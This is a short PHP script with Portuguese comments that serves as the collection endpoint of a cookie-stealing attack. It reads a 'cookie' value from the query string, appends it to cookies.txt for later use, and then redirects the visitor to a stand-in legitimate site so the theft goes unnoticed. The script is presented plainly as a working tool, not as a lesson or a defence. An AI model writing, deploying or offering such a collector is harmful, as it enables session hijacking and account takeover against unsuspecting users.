<?php
// Verificar se o cookie foi enviado
if (isset($_GET['cookie'])) {
    // Salvar o cookie em um arquivo de log ou enviar por email (dependendo do uso)
    $cookie = $_GET['cookie'];
    
    // Aqui você pode salvar os cookies em um arquivo de texto para análise posterior
    $file = fopen("cookies.txt", "a");
    fwrite($file, "Cookie: " . $cookie . "\n");
    fclose($file);

    // Opcional: redirecionar o usuário para uma página legítima
    header("Location: https://site-legitimo.com");
    exit;
}
